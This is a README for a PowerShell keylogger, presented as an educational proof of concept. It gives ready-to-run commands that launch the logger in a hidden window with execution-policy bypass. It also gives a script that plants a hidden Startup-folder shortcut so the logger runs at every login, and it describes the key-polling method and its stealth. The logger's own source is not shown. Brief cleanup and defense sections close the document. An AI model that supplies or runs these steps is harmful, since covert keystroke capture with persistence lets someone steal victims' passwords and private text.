PowerShell Keylogger: Educational Proof of Concept (PoC)
⚠️ Disclaimer
For Educational and Authorized Testing Purposes Only. Unauthorized use of this script on a computer you do not own or without explicit permission is illegal. This project is intended to demonstrate how Windows API calls (user32.dll) can be used by PowerShell to monitor hardware states and how persistence is achieved via the Windows Startup folder.

🛠️ Components
This project consists of three main parts:

kl.ps1: The core script that polls the keyboard state.

Persistence Mechanism: A script to create a hidden startup shortcut.

Log File: A local text file (kl.txt) where keystrokes are recorded.

🚀 Installation & Usage
1. Script Setup
Place the kl.ps1 file in your Documents folder:
C:\Users\<YourUsername>\Documents\kl.ps1

2. Immediate Execution (Hidden Mode)
To run the script immediately in the background without a window:

PowerShell
Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$HOME\Documents\kl.ps1`""
3. Enable Persistence (Auto-Start on Boot)
Run the following block in PowerShell to ensure the script runs every time the user logs in:

PowerShell
$WshShell = New-Object -ComObject WScript.Shell
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kl_auto.lnk"
$Shortcut = $WshShell.CreateShortcut($StartupPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$HOME\Documents\kl.ps1`""
$Shortcut.Save()
🔍 How it Works
API Hooking: The script uses Add-Type to import the GetAsyncKeyState function from user32.dll.

Polling: It iterates through ASCII/Virtual Key codes (8–254) every 40ms.

Formatting: Special keys like [ENTER], [SPACE], and [BACKSPACE] are formatted for readability.

Stealth: By using the -WindowStyle Hidden flag, the process runs without a visible console window.

🛑 Uninstallation / Cleanup
To completely remove the script and its traces:

Kill the process:

PowerShell
Get-Process powershell | Where-Object {$_.CommandLine -like "*kl.ps1*"} | Stop-Process -Force
Delete files:

Delete the shortcut in shell:startup (kl_auto.lnk).

Delete kl.ps1 and kl.txt from your Documents folder.

🛡️ Defenses Against This Method
Antimalware (AMSI): Windows Defender often flags GetAsyncKeyState patterns in PowerShell.

Execution Policies: Setting a strict Restricted execution policy.

Startup Monitoring: Regularly checking the shell:startup folder and Task Manager's "Startup" tab.

Author: [Your Name/Handle]

Date: March 2026
